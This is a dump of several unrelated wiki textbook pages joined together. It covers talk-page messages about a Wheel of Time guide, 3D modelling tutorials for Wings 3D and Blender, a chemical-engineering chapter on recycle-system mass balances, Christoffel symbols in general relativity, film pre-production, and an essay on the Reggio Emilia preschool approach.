Hey Hoogli, how are you doing? I haven't seen you in a while. I saw your new book that you created. I don't need to tell you that this could potentially be a NPOV problem. I'm certainly not raising a stink about it, I think there are some very interesting ways to approach this topic and keep it well within the range of NPOV. I know your work, so I know that you should be able to walk the line and I won't worry about it. Good luck with your new project! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 04:03, 6 December 2007 (UTC)

Was having a look at the Wheel of Time book... would you like those Wikipedia synopses imported? --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 20:54, 16 March 2007 (UTC)

== Cooperation and copyright concern ==
Hello and greetings from ''[[wikiasite:wot:A beginning|A Wheel of Time Wiki]]''.  I do not know why you decided to start this new project instead of contributing to ours.  It doesn't seem like a good idea to work independently like this, but I wish you the best.  However, I am concerned that some of your summaries appear to have been copied without a link back to the source, as required by the [[WB:GFDL|GFDL]].  For example, [[wikiasite:wot:The Eye of the World/Chapter 14]] appears to have been copied to [[Guide to the Wheel of Time/Books/The Eye of the World/Chapter 14]].  Please let me know if I'm wrong about this... --[[User:Gherald|Gherald]] 02:27, 3 April 2007 (UTC)</text>

      <text xml:space="preserve">'''Overview:'''

This tutorial provides instruction which could be considered formulaic for modeling a basic helicopter via box modeling. Though primarily directed towards users of Wings 3D, the same concepts can be applied to any modeling program that employs box modeling and Catmull Clark subdivision as a construction method. The version of Wings 3D used is 0.98.35, there may be better tools available in subsequent releases which are not employed here. Likewise this instruction may show features not available in earlier and older versions. Even though this tutorial is fairly basic, it may not point out every detail or concept in the program. Hints for default keyboard shortcuts will be in '''bold''' capitals. You should familiarize yourself with the general features and operations described in the Wings 3D manual before starting if you haven't done so already.


== Fuselage ==

=== Step 1: start with a cube ===

[[Image:WingsGenericHelo01.jpg]]

Start with a cube. This will be the fuselage.
Elongate it by scaling along the Z axis.

=== Step 2: Develop form by adding loops ===
[[Image:WingsGenericHelo02.jpg]]

Select the edge rin'''G''' consisting of vertical edges and '''C'''onnect.

=== Step 3: Block out the cab shape ===

[[Image:WingsGenericHelo03.jpg]]

Create another loop around the middle using method as described in the previous step.&lt;br&gt;
Extrude out the nose. Slide or move edges to get the approximate shape.

=== Step 4: Tail boom ===

[[Image:WingsGenericHelo04.jpg]]

Using extrude, scale|uniform, and move, create the tail boom as shown.&lt;br&gt;
Alternately, you can use inset and move to acomplish the same result.

=== Step 5: Centerline loop ===

[[Image:WingsGenericHelo05.jpg]]

Now would be a good time to add the centerline.&lt;br&gt;
You should know the method of adding such edge loops by now.

=== Step 6: Round the front ===

[[Image:WingsGenericHelo06.jpg]]

Select the edges on the front of the windshield and nose and move them forward.&lt;br&gt;
This will make the desired curvature when smoothing.

[[Image:WingsGenericHelo06Smooth.jpg]]

This is what it looks like so far using smooth preview. ('''Shift''' + '''Tab''')

=== Step 7 ===

[[Image:WingsGenericHelo07.jpg]]

From the smooth preview before, the tail boom ended up looking a little odd.&lt;br&gt;
Add edge loops to help control the smoothing as demonstrated in the picture.

=== Step 8 ===

[[Image:WingsGenericHelo08.jpg]]

Smooth the model. It should appear similar to the example.&lt;br&gt;
Note the subtle difference in the extra edges in the previous step caused in the tail.&lt;br&gt;
Now there are extra surfaces to work with in later steps.

=== Step 9: Vertical stabilizer ===
[[Image:WingsGenericHelo09.jpg]]

Select faces near the end on the top and bottom of the tail boom.&lt;br&gt;
Extrude region|normal, scale axis|Z, and move|Z to create the vertical stabilizer.

=== Step 10: Horizontal stabilizer ===
[[Image:WingsGenericHelo10.jpg]]

Now find some faces further forward on the tail boom and extrude out the horizontal stabilizers.

=== Step 11: Place conrol edges and adjust ===
[[Image:WingsGenericHelo11.jpg]]

Add edges to conrtrol future smoothing (shown selected.)&lt;br&gt;
A handy technique to use for &quot;control edgeloops&quot; is the double-slide.&lt;br&gt;
This is done by sliding to the extreme in relative mode, and then making another adjustment in absolute mode.&lt;br&gt;(Note the information on the lower right status area of the Wings3d window.)&lt;br&gt;
This is also a good time to make airfoil shape adjustments to the stabilizers.

=== Step 12: Adding engine hump ===

[[Image:WingsGenericHelo12.jpg]]

Select faces on top of the cab and extrude region as in the picture.&lt;br&gt;
This creates the engine compartment hump.

=== Step 13 ===

[[Image:WingsGenericHelo13.jpg]]

Move and/or slide edges on the engine hump to give it a nicer shape.

=== Step 14 ===

[[Image:WingsGenericHelo14.jpg]]

Add edges to the engine hump. (shown selected)

=== Step 15: Intake nacelle ===

[[Image:WingsGenericHelo15.jpg]]

Select these faces and extrude region by 0 units.

=== Step 16 ===

&lt;!--  Commented out because image was deleted: [[Image:WingsGenericHelo16.jpg]] --&gt;

Without deselecting faces from the previous step, hit '''L''' for '''L'''oop.&lt;br&gt;
This will select the edge loop around the region of selected faces. Then slide.&lt;br&gt;
You may need to make some other adjustments to square it up.

=== Step 17 ===

&lt;!--  Commented out because image was deleted: [[Image:WingsGenericHelo17.jpg]] --&gt;

Select the faces inside the loop again.&lt;br&gt;
Extrude inward to form the air intake nacelle.

=== Step 18 ===

[[Image:WingsGenericHelo18.jpg]]

Select all faces inside the nacelle. (Might be simple as hitting the '''+''' key.)&lt;br&gt;
Extrude region|normal a small amount. This will help control any future smoothing.

=== Step 19: Exhaust port ===

[[Image:WingsGenericHelo19.jpg]]

Repeat the same process used to make the intake nacelle to make the exhaust opening.

=== Step 20: Rotor shaft opening ===

[[Image:WingsGenericHelo20.jpg]]

Select a vertice on top of the engine hump and bevel.&lt;br&gt;
You may have to move or slide some edges to place the vertice in a suitable position before beveling.

=== Step 21 ===

[[Image:WingsGenericHelo21.jpg]]

Cut edges around bevel and connect to surrounding vertices as shown in the picture.

=== Step 22 ===

&lt;!--  Commented out because image was deleted: [[Image:WingsGenericHelo22.jpg]] --&gt;

Select the vertices around the bevel that was made earlier.&lt;br&gt;
(Select face inside and switch to vertice mode.)&lt;br&gt;
Use Deform|Inflate and adjust to 100%.&lt;br&gt;
It should make a circle as in the example.

=== Step 23 ===

[[Image:WingsGenericHelo23.jpg]]

Select the face of the circle you just made and extrude it inward.&lt;br&gt;
This will be the hole for the main rotor shaft.

=== Step 24 ===

&lt;!--  Commented out because image was deleted: [[Image:WingsGenericHelo24.jpg]] --&gt;

Select all faces inside the hole and extrude region by a small amount.

=== Step 25 ===

[[Image:WingsGenericHelo25.jpg]]

Inset and collapse bottom face to form a star.&lt;br&gt;
Then add an edgeloop inside the side.&lt;br&gt;
Set selected edges in picture to hard.

=== Step 26 ===

[[Image:WingsGenericHelo26.jpg]]

Select the fuselage body and '''S'''mooth.&lt;br&gt;
You should have something akin to what is in the example picture.&lt;br&gt;
While in body mode, this is now a good time to rename it to &quot;Fuselage&quot;&lt;br&gt;
instead of &quot;Cube1&quot; if you haven't done so already.&lt;br&gt;
We'll probably not mess with the fuselage again until texturing time.

      <text xml:space="preserve">== Differences between Recycle and non-Recycle systems ==

The biggest difference between recycle and non-recycle systems is that ''the extra splitting and recombination points must be taken into account, and the properties of the streams change from before to after these points''. To see what is meant by this, consider any arbitrary process in which a change occurs between two streams:

 Feed -&gt; Process -&gt; Outlet

If we wish to implement a recycle system on this process, we often will do something like this:

[[Image:Recycle Schematic.PNG]]

The &quot;extra&quot; stream between the splitting and recombination point must be taken into account, but the way to do this is ''not'' to do a mass balance on the process, since ''the recycle stream itself does not go into the process, only the recombined stream does''.

Instead, we take it into account by performing a mass balance on the ''recombination point'' and one on the ''splitting point''.

=== Assumptions at the Splitting Point ===

The recombination point is relatively unpredictable because the composition of the stream leaving depends on both the composition of the feed and the composition of the recycle stream. However, the ''spliitng point'' is special because '''when a stream is split, it generally is split into two streams with equal composition'''. This is a piece of information that counts towards &quot;additional information&quot; when performing a degree of freedom analysis. 

As an additional specification, it is common to know the ''ratio'' of splitting, i.e. how much of the exit stream from the process will be put into the outlet and how much will be recycled. This also counts as &quot;additional information&quot;.

=== Assumptions at the Recombination Point ===

The recombination point is generally not specified like the splitting point, and also the recycle stream and feed stream are very likely to have different compositions. The important thing to remember is that you can generally use the properties of the stream coming from the splitting point for the stream entering the recombination point, unless it goes through another process in between (which is entirely possible).

== Degree of Freedom Analysis of Recycle Systems ==

Degree of freedom analyses are similar for recycle systems to those for other systems, but with a couple important points that the engineer must keep in mind:

# The recombination point and the splitting point must be counted in the degree of freedom analysis as &quot;processes&quot;, since they can have unknowns that aren't counted anywhere else.
# When doing the degree of freedom analysis on the splitting point, ''you should not label the concentrations as the same but leave them as separate unknowns until after you complete the DOF analysis'' in order to avoid confusion, since labeling the concentrations as identical &quot;uses up&quot; one of your pieces of information and then you can't count it.

As an example, let's do a degree of freedom analysis on the hypothetical system above, assuming that all streams have two components.

* '''Recombination Point''': 6 variables (3 concentrations and 3 total flow rates) - 2 mass balances = ''4'' DOF
* '''Process''': Assuming it's not a reactor and there's only 2 streams, there's 4 variables and 2 mass balances = ''2'' DOF
* '''Splitting Point''': 6 variables - 2 mass balances '''- 1 knowing compositions are the same - 1 splitting ratio = 2 DOF'''

So the total is 4 + 2 + 2 - 6 (in-between variables) = '''2 DOF'''. Therefore, if the feed is specified then this entire system can be solved! Of course the results will be different if the process has more than 2 streams, if the splitting is 3-way, if there are more than two components, and so on.

== Suggested Solving Method ==

The solving method for recycle systems is similar to those of other systems we have seen so far but as you've likely noticed, they are increasingly complicated. Therefore, the importance of '''making a plan''' becomes of the utmost importance. The way to make a plan is generally as follows:

# Draw a completely labeled flow chart for the process.
# Do a DOF analysis to make sure the problem is solvable.
# If it is solvable, '''a lot of the time, the best place to start with a recycle system is with a set of overall system balances, sometimes in combination with balances on processes on the border'''. The reason for this is that the overall system balance cuts out the recycle stream entirely, since the recycle stream does not enter or leave the system as a whole but merely travels between two processes, like any other intermediate stream. Often, the composition of the recycle stream is unknown, so this simplifies the calculations a good deal.
# Find a set of independent equations that will yield values for a certain set of unknowns (this is often most difficult the first time; sometimes, one of the unit operations in the system will have 0 DOF so start with that one. Otherwise it'll take some searching.)
# Considering those variables as known, do a new DOF balance until something has 0 DOF. Calculate the variables on that process.
# Repeat until all processes are specified completely.

== Example problem: Improving a Separation Process ==

It has been stated that recycle can help to This example helps to show that this is true and also show some limitations of the use of recycle on real processes. 

Consider the following proposed system without recycle.

{{example|A mixture of 50% A and 50% B enters a separation process that is capable of splitting the two components into two streams: one containing 60% of the entering A and half the B, and one with 40% of the A and half the B (all by mass):

[[Image:Separator Example Flowchart.PNG]]

If 100 kg/hr of feed containing 50% A by mass enters the separator, what are the concentrations of A in the exit streams?}}


A degree of freedom analysis on this process:

4 unknowns (&lt;math&gt;\dot{m}_2,x_{A2},\dot{m}_3,\mbox{ and } x_{A3} &lt;/math&gt;), 2 mass balances, and '''2''' pieces of information (knowing that 40% of A and half of B leaves in stream 3 is not independent from knowing that 60% of A and half of B leaves in stream 2) = '''0''' DOF.

Methods of previous chapters can be used to determine that &lt;math&gt; \dot{m}_2 = 55 \frac{kg}{hr}, x_{A2} = 0.545, \dot{m}_3=45 \frac{kg}{hr}&lt;/math&gt; and &lt;math&gt; x_{A3} = 0.444 &lt;/math&gt;. This is good practice for the interested reader.

If we want to obtain a greater separation than this, one thing that we can do is use a ''recycle system'', in which a portion of one of the streams is siphoned off and remixed with the feed stream in order for it to be re-separated. The choice of which stream should be re-siphoned depends on the desired properties of the exit streams. The effects of each choice will now be assessed.

=== Implementing Recycle on the Separation Process ===

{{example|Suppose that in the previous example, a recycle system is set up in which half of stream 3 is siphoned off and recombined with the feed (which is still the same composition as before). Recalculate the concentrations of A in streams 2 and 3. Is the separation more or less effective than that without recycle? Can you see a major limitation of this method? How might this be overcome?}}

This is a rather involved problem, and must be taken one step at a time. The analyses of the cases for recycling each stream are similar, so the first case will be considered in detail and the second will be left for the reader.

==== Step 1: Draw a Flowchart ====

You must be careful when drawing the flowchart because the separator separates 60% of all the A that enters it into stream 2, '''not 60% of the fresh feed stream'''. 

Note: there is a mistake in the flow scheme. m6 and xA6 before the process is actually m4 and xA4

[[Image:Separator Example Flowchart with Recycle.PNG]]

==== Step 2: Do a Degree of Freedom Analysis ====

Recall that you must include the recombination and splitting points in your analysis.

* '''Recombination point''': 4 unknowns - 2 mass balances = '''2''' degrees of freedom
* '''Separator''': 6 unknowns (nothing is specified) - 2 independent pieces of information - 2 mass balances = '''2''' DOF
* '''Splitting point''': 6 unknowns (again, nothing is specified) - 2 mass balances - 1 assumption that concentration remains constant - 1 splitting ratio = '''2''' DOF

* '''Total''' = 2 + 2 + 2 - 6 = '''0'''. Thus the problem is completely specified.

==== Step 3: Devise a Plan and Carry it Out ====

First, look at the entire system, since none of the original processes individually had 0 DOF.

* '''Overall mass balance on A''': &lt;math&gt; 0.5* 100\frac{kg}{h} = \dot{m}_2*x_{A2} + \dot{m}_6*x_{A6} &lt;/math&gt;
* '''Overall mass balance on B''': &lt;math&gt; 50\frac{kg}{h} = \dot{m}_2*(1-x_{A2}) + \dot{m}_6*(1-x_{A6}) &lt;/math&gt;

We have 4 unknowns and 2 equations at this point. This is where the problem solving requires some ingenuity. First, lets see what happens when we combine this information with the splitting ratio and constant concentration at the splitter:

* '''Splitting Ratio''': &lt;math&gt; {m}_6 = \frac{\dot{m}_3}{2} &lt;/math&gt;
* '''Constant concentration''': &lt;math&gt; x_{A6} = x_{A3} &lt;/math&gt;

Plugging these into the overall balances we have:

* '''On A''': &lt;math&gt; 50 = \dot{m}_2*x_{A2} + \frac{\dot{m}_3}{2}*x_{A3} &lt;/math&gt;
* '''Total''': &lt;math&gt; 50 = \dot{m}_2*(1-x_{A2}) + \frac{\dot{m}_3}{2}*(1-x_{A3}) &lt;/math&gt;

Again we have more equations than unknowns ''but we know how to relate everything in these two equations to the inlet concentrations in the separator''. This is due to the conversions we are given:

* '''60% of entering A goes into stream 2''' means &lt;math&gt; \dot{m}_2*x_{A2} = 0.6*x_{A4}*\dot{m}_4 &lt;/math&gt;
* '''40% of entering A goes into stream 3''' means &lt;math&gt; \dot{m}_3*x_{A3} = 0.4*x_{A4}*\dot{m}_4 &lt;/math&gt;
* '''50% of entering B goes into stream 2''' means &lt;math&gt; \dot{m}_2*(1-x_{A2}) = 0.5*(1-x_{A4})*\dot{m}_4 &lt;/math&gt;
* '''50% of entering B goes into stream 3''' means &lt;math&gt; \dot{m}_3*x_{A3} = 0.5*(1-x_{A4})*\dot{m}_4 &lt;/math&gt;

Spend some time trying to figure out where these equations come from, it's all definition of mass fraction and translating words into algebraic equations.

Plugging in all of these into the existing balances, we finally obtain 2 equations in 2 unknowns:

{{box|'''On A''': &lt;math&gt; 50 = 0.6 \dot{m}_4*x_{A4} + \frac{0.4}{2} \dot{m}_4*x_{A4} &lt;/math&gt;

'''On B''': &lt;math&gt; 50 = 0.5 \dot{m}_4*(1-x_{A4})+ \frac{0.5}{2} \dot{m}_4*(1-x_{A4}) &lt;/math&gt;}}

Solving these equations gives:

{{box|&lt;math&gt; \dot{m}_4 = 129.17\frac{kg}{h}, x_{A4} = 0.484 &lt;/math&gt;}}

{{NOTE|Notice that two things happened as expected: the concentration of the stream entering the evaporator went down (because the feed is mixing with a more dilute recycle stream), and the total flowrate went up (again due to contribution from the recycle stream). This is always a good rough check to see if your answer makes sense, for example if the flowrate was lower than the feed rate you'd know something went wrong}}

Once these values are known, you can choose to do a balance either on the separator or on the recombination point, since both now have 0 degrees of freedom. We choose the separator because that leads directly to what we're looking for.

The mass balances on the separator can be solved using the same method as that without a recycle system, the results are:

{{box|&lt;math&gt;\dot{m}_2 = 70.83 \frac{kg}{hr}, x_{A2} = 0.530, \dot{m}_3 = 58.33 \frac{kg}{hr}, x_{A3} = 0.429 &lt;/math&gt;}}

Now since we know the flowrate of stream 3 and the splitting ratio we can find the rate of stream 6:

{{box|&lt;math&gt; \dot{m}_6 = \frac{\dot{m}_3}{2} = 29.165\frac{kg}{hr}, x_{A6}=x_{A3}= 0.429 &lt;/math&gt; }}

{{NOTE|You should check to make sure that m2 and m6 add up to the total feed rate, otherwise you made a mistake.}}

Now we can assess how effective the recycle is. The concentration of A in the liquid stream ''was'' reduced, by a small margin of 0.015 mole fraction. However, this extra reduction came at a pair of costs: the flow rate of dilute stream was significantly reduced: from 45 to 29.165 kg/hr! '''This limitation is important to keep in mind and also explains why we bother trying to make very efficient separation processes.'''

      <text xml:space="preserve">( &lt;&lt; Back to [[General Relativity]])

== Definition of Christoffel Symbols ==

Consider an arbitrary contravariant vector field defined all over a Lorentzian manifold, and take &lt;math&gt;A^{i}&lt;/math&gt; at &lt;math&gt;x^{i}&lt;/math&gt;, and at a neighbouring point, the vector is &lt;math&gt;A^{i}+dA^{i}&lt;/math&gt; at &lt;math&gt;x^{i}+dx^{i}&lt;/math&gt;.

Next parallel transport &lt;math&gt;A^{i}&lt;/math&gt; from &lt;math&gt;x^{i}&lt;/math&gt; to &lt;math&gt;x^{i}+dx^{i}&lt;/math&gt;, and suppose the change in the vector is &lt;math&gt;\delta A^{i}&lt;/math&gt;.  Define:

&lt;math&gt;DA^{i} = dA^{i} -\delta A^{i}&lt;/math&gt;

The components of &lt;math&gt;\delta A^{i}&lt;/math&gt; must have a linear dependence on the components of &lt;math&gt;A^{i}&lt;/math&gt;.  Define ''Christoffel symbols'' &lt;math&gt;\Gamma^{i}_{kl}&lt;/math&gt;:

&lt;math&gt;\delta A^{i} = -\Gamma^{i}_{kl} A^{k} dx^{l}&lt;/math&gt;

Note that these Christoffel symbols are:
&lt;ul&gt;
&lt;li&gt;dependent on the coordinate system (hence they are NOT tensors)
&lt;li&gt;functions of the coordinates
&lt;/ul&gt;

Now consider arbitrary contravariant and covariant vectors &lt;math&gt;A^{i}&lt;/math&gt; and &lt;math&gt;B_{i}&lt;/math&gt; respectively.  Since &lt;math&gt;A^{i}B_{i}&lt;/math&gt; is a scalar, &lt;math&gt;\delta (A^{i}B_{i}) = 0&lt;/math&gt;, one arrives at:

&lt;math&gt;B_{i}\delta A^{i} + A^{i}\delta B_{i} = 0&lt;/math&gt;

&lt;math&gt;\Rightarrow A^{i}\delta B_{i} = \Gamma^{i}_{kl} A^{k} B_{i} dx^{l}&lt;/math&gt;

&lt;math&gt;\Rightarrow A^{i}\delta B_{i} = \Gamma^{k}_{il} A^{i} B_{k} dx^{l}&lt;/math&gt;

&lt;math&gt;\Rightarrow \delta B_{i} = \Gamma^{k}_{il} B_{k} dx^{l}&lt;/math&gt;

== Connection Between Covariant And Regular Derivatives ==

From above, one can obtain the relations between covariant derivatives and regular derivatives:

&lt;math&gt;{A^{i}}_{;l} = \frac{\partial A^{i}}{\partial x^{l}} + \Gamma^{i}_{kl} A^{k}&lt;/math&gt;

&lt;math&gt;A_{i;l} = \frac{\partial A_{i}}{\partial x^{l}} - \Gamma^{k}_{il} A_{k}&lt;/math&gt;

Analogously, for tensors:

&lt;math&gt;{A^{ik}}_{;l} = \frac{\partial A^{ik}}{\partial x^{l}} + \Gamma^{i}_{ml}A^{mk} + \Gamma^{k}_{ml}A^{im}&lt;/math&gt;

== Calculation of Christoffel Symbols ==

From &lt;math&gt;g_{ik}DA^{k} + A^{k}Dg_{ik} = D\left(g_{ik}A^{k}\right) = DA_{i} = g_{ik} DA^{k}&lt;/math&gt;, one can conclude that &lt;math&gt;g_{ik;l} = 0&lt;/math&gt;.

However, since &lt;math&gt;g_{ik}&lt;/math&gt; is a tensor, its covariant derivative can be expressed in terms of regular partial derivatives and Christoffel symbols:

&lt;math&gt;g_{ik;l} = \frac{\partial g_{ik}}{\partial x^{l}} - g_{mk}\Gamma^{m}_{il} - g_{im}\Gamma^{m}_{kl} = 0&lt;/math&gt;

Rewriting the expression above, and then performing permutation on ''i, k'' and ''l'':

&lt;math&gt;\frac{\partial g_{ik}}{\partial x^{l}} = g_{mk}\Gamma^{m}_{il} + g_{im}\Gamma^{m}_{kl}&lt;/math&gt;

&lt;math&gt;\frac{\partial g_{kl}}{\partial x^{i}} = g_{ml}\Gamma^{m}_{ki} + g_{km}\Gamma^{m}_{li}&lt;/math&gt;

&lt;math&gt;-\frac{\partial g_{li}}{\partial x^{k}} = - g_{mi}\Gamma^{m}_{lk} - g_{lm}\Gamma^{m}_{ik}&lt;/math&gt;

Adding up the three expressions above, one arrives at (using the notation &lt;math&gt;\frac{\partial A^{i}}{\partial x^{j}} = {A^{i}}_{,j}&lt;/math&gt;):

&lt;math&gt;2 g_{mk}\Gamma^{m}_{il} = g_{ik,l} + g_{kl,i} - g_{li,k}&lt;/math&gt;

Multiplying both sides by &lt;math&gt;\frac{1}{2} g^{kn}&lt;/math&gt;:

&lt;math&gt;\Rightarrow \Gamma^{n}_{il} = \delta^{n}_{m}\Gamma^{m}_{il} = \frac{1}{2} g^{kn}\left(g_{ik,l} + g_{kl,i} - g_{li,k}\right)&lt;/math&gt;

Hence if the metric is known, the Christoffel symbols can be calculated.

==Target Audience==
This book is intended for adult and teenage learners of English as a second language who are at B2 (Upper Intermediate) level.  Usually students of this level have studied English for at least 4 years or have previously taken the University of Cambridge PET examination or wish to sit the FCE examination in the future.  This book is also suitable for use by students who are preparing for similar examinations, for example the 'matura' examination in Polish state schools.

Because this book is read by people of all ages any new edits will have to be reviewed by an administrator or a reviewer before they are visible.

The first step of pre-production is creating a budget and schedule for the production and post-production.  While the budget and schedule will change constantly throughout prep, into production, even up to delivery, you have to start somewhere.  The initial budget and schedule will be source of much discussion and compromise, but it gives all the department a common ground from which to plan.  It also informs the studios or other interested parties (bond company, investors, etc.) what is the plan.

==Budget==
A production budget covers not just the production portion (when film is exposed, videotape recorded, or other storage media used).  It must cover pre-production and post-production as well.  Often, at least some of the costs of development and/or distribution and marketing are also in there.

==Schedule==
Whereas the budget will cover from pre-production through post, the schedule will only cover the period of production, images are put to film, video, or other media.  There will be another schedule drawn up to cover post-production, but that is often done later and is considered part of the post-production process.

People often think of filmmaking as the everything that happens from production onward, but getting ready for that first day of filming is incredibly important and a lot of work.  This phase of prepping for the shoot is '''''pre-production''''' which usually referred to by the shorthand &lt;b&gt;&lt;i&gt;prep&lt;/b&gt;&lt;/i&gt;.

Pre-production is the first, very practical step in the filmmaking process.  Whereas development is somewhat amorphous with every film or TV show having a different story of its development process, pre-production is straight-forward in approach if not execution.  This is not to say it is easy, nor that different projects deal with different problems, but the basic work that needs to be done can be clearly broken down with allowances for each project's unique characteristics.

The steps in pre-production have a rough order of execution, though they may shift a bit and certainly overlap.  As in production and post, there are departments, each dealing primarily with one aspect of prep.  Below will be a breakdown of the steps in pre-production by department in their rough order of start (very little is 'finished' in pre-production and nearly every aspect continues on at least into the beginning of production).</text>

      <text xml:space="preserve">==Introduction into the Reggio Emilia Approach==

                                                   Sheena Smith

==Introduction==
	
The inspiration for the Reggio Emilia approach came from Reggio Emilia, Italy.  In Italy, all the preschools are centered on this approach.  It is a city run program for children from birth to the age of six (Cyert Center, 2004).  The philosophy is that, “children’s interactions and relationships with other children and adults are a vital component of their learning” (Schiller, 1995).  Reggio Emilia schools in the United States, Italy, and other countries around the world differ greatly from standard preschools here in the United States.  Some of the key differences and components of the Reggio Emilia program is its role in the community, attention to the environment, and its emergent curriculum which functions as a part of the teachers and the children.

==Role of the Community==

The community is a big part of the Reggio Emilia schools.  There are regularly scheduled meetings for parents to take part in.  These meetings are scheduled in the evening so that working parents are able to attend.  The parents and teachers discuss issues regarding school policies, child development concerns, and curriculum planning and evaluations (Wikipedia, 2007).  The parents are involved in the whole process of the education of their children.  Teachers send home journals of children’s thoughts and ideas expressed in class.  This kind of cooperation among teachers and parents make learning on the children’s part much easier and complete.


==Attention to the Environment==
	
According to Lilian G. Katz, “The physical environment of a preschool center is considered a ‘teacher’ in and of itself!” (Katz, 1990).  This holds true in a Reggio Emilia school.  The environment is considered the “third” teacher to the students attending this kind of program.  The building itself and classrooms are filled with indoor plants, vines, and lots of natural light.  Natural light enters the classrooms through wall-sized windows letting the children connect with the outside world.  All of the classrooms have a door to the outside and open to a center piazza.  Each classroom flows well with each other and the surrounding community.  The lunch rooms, courtyards and bathrooms are designed in a way to encourage community among all the students (Wikipedia, 2007).  Incorporated into each school is a common space available to all children in the school that includes dramatic play and work tables (Cyert Center, 2004). 

Each classroom is connected with a phone, passageway or a window.  The classrooms are equipped with art centers called atelier (Gandini, 1993).  In the atelier are easels, watercolors, crayons, markers, paper, and any art materials children need to be creative.  Another part of the classroom has books about artists and a place where children can read comfortably (Schiller, 1995).  Displayed around the classroom, among all the photographs of the children and carefully placed mirrors in the school, are works completed by the children with transcriptions of their discussions about the work.

“The physical environment of a preschool center is considered a ‘teacher’ in and of itself!” (Katz, 1990).  
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

==Emergent Curriculum==

There is no time schedule where at some part of the day the students are learning about science, then language arts, and then math.  The kind of schedule the students follow is that there is a group meeting when the students arrive in the morning.  Then there is a work period, play period, lunch time, play time, nap time, and then another work period or play period (Hertzog, 2001).  For their work period, there is no set curriculum that the teachers must follow.  The curriculum is an emergent curriculum which is child centered.  Emergent means that is builds upon the interests of the child.  The teachers have broad goals but can follow the lead and interests of the children (Schiller, 1995).  During the work periods, a teacher will work with one small group on their project while the other students are engaged in self selected activities.

The projects are teacher directed and child initiated and begins with the teacher observing the children and asking the children questions on a topic that interests the child.  The students then do in depth studies of the content that interests the children of that group (Wikipedia, 2007).  The project moves in unanticipated directions.  To avoid confusion the teachers help children make decisions about direction of study, how to research the topic, and how to represent the topic (Cyert Center, 2004).  The projects can range in length from one week to the whole school year.  When the students are content to be complete with their project they depict their knowledge through drawing, sculpting, dramatic play, or writing.

At every school, there is a visual art specialist, an atelierista, who works closely with the other teachers and children (Gandini, 1993).  The atelierista guides the children into appropriate media choices to complete their ideas and projects.  Because art is such an integral part of all activities, the students’ old works, finished and unfinished, are available to them to finish or add on.  While they work on their art projects, the teachers talk to the children and write down any thoughts or ideas the students have.  They display the students’ discussions with their art work around the classroom and school (Schiller, 1995). 

In order for this curriculum to work, the teachers must also learn with the students.  The teachers take turns with the following roles:  observing, note taking, and recording observations between children.  After all observations are recorded, they are shared with other teachers and parents in the planning of the students’ projects.  It is crucial that teachers become skillful observers of the children.  Their observations guide the curriculum planning and implementation (Wikipedia, 2007).

==Conclusion==

The Reggio Emilia approach to learning is a constructivist approach where the students learn at their own pace and guide the curriculum.  It is all about the children.  The children’s interests lead them into a project that is researched in depth at a level that they can understand.  The children’s thoughts and ideas are implemented into the curriculum and planning and are shared with the community.  Reggio Emilia works because the children are learning what they want to learn with the help of their parents, teachers, and the community.

==Essay Question==

Describe fully the kind of curriculum used in Reggio Emilia schools.

The students follow an emergent curriculum.  Emergent means that the curriculum is child centered and integrated and builds upon the interests of the child.  The teacher has broad goals for the students, but the children are the ones that guide where their learning goes.  The teachers first observe the children and their thoughts, ideas, and interests.  They take turns with other teachers taking notes, observing, and recording observations between children.  The teachers then take the observations and notes recorded and share them with the other teachers and parents.  From there, the teachers take small groups and begin an in depth research into the interest of choice for the children.  The teachers help the students with research, the direction of the study and how to represent the topic.  The projects can go in any direction and can last from one week to the whole school year.  When the students have finished their research, they then display the information obtained through sculptures, drawings, dramatic play, or writing.  To help them with their display, visual art teachers help the students chose the right media that best fits their projects. The students’ works are displayed around the classroom and school.  Along with their projects are descriptions of the students’ talk while working on the project.

      <text xml:space="preserve">== Overview ==


This tutorial will guide you through the process of making 3D tiling backgrounds for use with web pages, your desktop, or anything else for that matter. We will be using Blender and a graphic editing program such as Adobe Photoshop or GIMP. I will provide detailed explanation to cator to beginners, however more experienced Blenderists can probably get away with just following the picture diagrams provided. You may also find the diagrams useful if English is not your native language, or if you hate reading instructions.

----

== Create The Object You Wish To Tile ==
Start up Blender and look at your lonely cube. We will use this cube as a starting point for the sake of demonstration, but feel free to use any shape you like. 
Press &quot;'''Tab'''&quot; to enter '''Edit Mode'''.
Press the &quot;'''E'''&quot; key on your keyboard and the '''Extrude''' menu will appear. Select &quot;'''Individual Faces'''&quot;.
As you then drag your mouse cursor you will see some numbers move in the bottom left in the window and text saying &quot;Shrink/Fatten&quot;. I recommend setting it to 1.0000 to keep it simple. Hold down the &quot;'''Ctrl'''&quot; key while dragging to do so in set increments.

Next, with the six faces of the cube still selected, press the &quot;'''S'''&quot; key to scale those faces. I recommend scaling to 0.8000. 

[[Image:3dbg-extrude&amp;scale.jpg]]

Good. Now that we have created our object we will prepare to tile it. 

----

== Specify Your Tiling Area ==
&quot;'''Tab'''&quot; back into '''Object Mode''' and press &quot;'''NumPad 7'''&quot; to go to the Top View, or manually click &quot;'''View'''&quot; at the bottom of the window and select &quot;'''Top'''&quot;.

Press &quot;'''spacebar'''&quot; and from the menu that appears select &quot;'''Add'''&quot; '''&gt;''' &quot;'''Mesh'''&quot; '''&gt;''' &quot;'''Plane'''&quot;.
The plane has appeared, but is obstructed by our cube object, so press &quot;'''S'''&quot; to scale the plane to 5.0000.

[[Image:3dbg-planescale.jpg]]

You'll notice that I've colored my plane black. This is only to make it easier for you to see. You need not bother with this as we will be deleting the face of this plane shortly. 

[[Image:3dbg-planeblack.jpg]]

We now have an easily visible boundary representing the area which will be tiled. 
If at any point we decide we no longer need or want this we can move it to another layer by pressing &quot;'''M'''&quot; and selecting a layer to move it to.

----

== Tile Away! ==
Now the fun part begins. If you have created 2D tiling backgrounds before, this concept will be very familiar to you. 

While in '''Object Mode''', select your cube object. At this point you have a couple of options. One is to make duplicates of the cube object. Another is to make '''''linked''''' duplicates of the cube object. I recommend making linked duplicates because you can later edit the mesh of one object in order to change the mesh of all the duplicated objects. This can be especially useful if you later plan to animate your tiling background ''(careful not to distract from the foreground)''. It is also useful if you want to experiment with new designs easily without having to re-place all your objects.


